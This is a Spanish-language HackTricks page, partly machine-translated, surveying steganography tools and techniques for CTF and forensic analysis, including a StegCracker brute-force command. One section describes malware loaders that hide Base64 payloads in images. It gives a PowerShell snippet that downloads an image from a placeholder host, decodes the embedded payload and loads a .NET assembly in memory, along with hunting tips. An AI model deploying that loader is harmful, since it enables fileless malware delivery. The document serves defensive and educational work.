# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Extracción de datos de archivos**

### **Binwalk**

Una herramienta para buscar en archivos binarios datos y archivos ocultos incrustados. Se instala mediante `apt` y su código fuente está disponible en [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Recupera archivos basándose en sus encabezados y pies de página; útil para imágenes png. Se instala vía `apt` y su código fuente está en [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Ayuda a ver los metadatos de archivos, available [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Similar a exiftool, para la visualización de metadatos. Instalable vía `apt`, código fuente en [GitHub](https://github.com/Exiv2/exiv2), y cuenta con un [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Archivo**

Identifica el tipo de archivo con el que estás tratando.

### **Strings**

Extrae cadenas legibles de archivos, usando varios ajustes de codificación para filtrar la salida.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Útil para comparar un archivo modificado con su versión original encontrada en línea.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Extracción de datos ocultos en texto**

### **Datos ocultos en espacios**

Los caracteres invisibles en espacios que parecen vacíos pueden ocultar información. Para extraer estos datos, visita [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Extracción de datos de imágenes**

### **Identificación de detalles de imagen con GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) sirve para determinar el tipo de archivo de imagen e identificar una posible corrupción. Ejecuta el siguiente comando para inspeccionar una imagen:
```bash
./magick identify -verbose stego.jpg
```
Para intentar reparar una imagen dañada, añadir un comentario de metadatos puede ayudar:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide para ocultación de datos**

Steghide facilita ocultar datos dentro de `JPEG, BMP, WAV, and AU` files, siendo capaz de incrustar y extraer datos cifrados. La instalación es sencilla usando `apt`, y su [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Comandos:**

- `steghide info file` revela si un archivo contiene datos ocultos.
- `steghide extract -sf file [--passphrase password]` extrae los datos ocultos, contraseña opcional.

Para extracción vía web, visita [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- To attempt password cracking on Steghide, use [stegcracker](https://github.com/Paradoxis/StegCracker.git) as follows:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg para archivos PNG y BMP**

zsteg se especializa en descubrir datos ocultos en archivos PNG y BMP. La instalación se realiza vía `gem install zsteg`, con su [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` aplica todos los métodos de detección en un archivo.
- `zsteg -E file` especifica una carga útil para la extracción de datos.

### **StegoVeritas y Stegsolve**

**stegoVeritas** comprueba metadatos, realiza transformaciones de imagen y aplica LSB brute forcing, entre otras funciones. Usa `stegoveritas.py -h` para la lista completa de opciones y `stegoveritas.py stego.jpg` para ejecutar todas las comprobaciones.

**Stegsolve** aplica varios filtros de color para revelar textos o mensajes ocultos dentro de imágenes. Está disponible en [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT para detección de contenido oculto**

Las técnicas de Transformada Rápida de Fourier (FFT) pueden revelar contenido oculto en imágenes. Recursos útiles incluyen:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy para archivos de audio e imagen**

Stegpy permite incrustar información en archivos de imagen y audio, soportando formatos como PNG, BMP, GIF, WebP y WAV. Está disponible en [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck para análisis de archivos PNG**

Para analizar archivos PNG o validar su autenticidad, usa:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Herramientas adicionales para el análisis de imágenes**

Para una exploración adicional, considera visitar:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Payloads Base64 delimitados por marcadores ocultos en imágenes (malware delivery)

Los commodity loaders ocultan cada vez más payloads codificados en Base64 como texto plano dentro de imágenes válidas (a menudo GIF/PNG). En lugar del LSB a nivel de píxel, el payload se delimita mediante cadenas únicas de marcador de inicio/fin incrustadas en el texto/metadatos del archivo. Un stager de PowerShell luego:
- Descarga la imagen vía HTTP(S)
- Ubica las cadenas de marcador (ejemplos observados: <<sudo_png>> … <<sudo_odt>>)
- Extrae el texto intermedio y lo decodifica de Base64 a bytes
- Carga el ensamblado .NET en memoria e invoca un método de entrada conocido (no se escribe ningún archivo en disco)

Fragmento mínimo de PowerShell para carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notas
- Esto corresponde a ATT&CK T1027.003 (steganography). Las cadenas marcadoras varían entre campañas.
- Hunting: escanear imágenes descargadas en busca de delimitadores conocidos; marcar `PowerShell` que use `DownloadString` seguido de `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Extracción de datos de audios**

**Audio steganography** ofrece un método único para ocultar información dentro de archivos de audio. Se utilizan diferentes herramientas para insertar o recuperar contenido oculto.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide es una herramienta versátil diseñada para ocultar datos en archivos JPEG, BMP, WAV y AU. Se proporcionan instrucciones detalladas en la [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Esta herramienta es compatible con una variedad de formatos, incluidos PNG, BMP, GIF, WebP y WAV. Para más información, consulte la [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg es crucial para evaluar la integridad de archivos de audio, proporcionando información detallada y detectando cualquier discrepancia.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg sobresale en ocultar y extraer datos dentro de archivos WAV usando la estrategia least significant bit. Está disponible en [GitHub](https://github.com/ragibson/Steganography#WavSteg). Los comandos incluyen:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound permite el cifrado y la detección de información dentro de archivos de sonido usando AES-256. Se puede descargar desde [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Una herramienta invaluable para la inspección visual y analítica de archivos de audio; Sonic Visualizer puede revelar elementos ocultos indetectables por otros medios. Visita el [official website](https://www.sonicvisualiser.org/) para más información.

### **DTMF Tones - Dial Tones**

La detección de tonos DTMF en archivos de audio puede realizarse mediante herramientas en línea como [this DTMF detector](https://unframework.github.io/dtmf-detect/) y [DialABC](http://dialabc.com/sound/detect/index.html).

## **Otras técnicas**

### **Binary Length SQRT - QR Code**

Los datos binarios cuya raíz cuadrada es un número entero podrían representar un QR code. Usa este fragmento para comprobar:
```python
import math
math.sqrt(2500) #50
```
Para la conversión de binario a imagen, consulta [dcode](https://www.dcode.fr/binary-image). Para leer códigos QR, usa [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Traducción de Braille**

Para traducir Braille, el [Branah Braille Translator](https://www.branah.com/braille-translator) es un recurso excelente.

## **Referencias**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
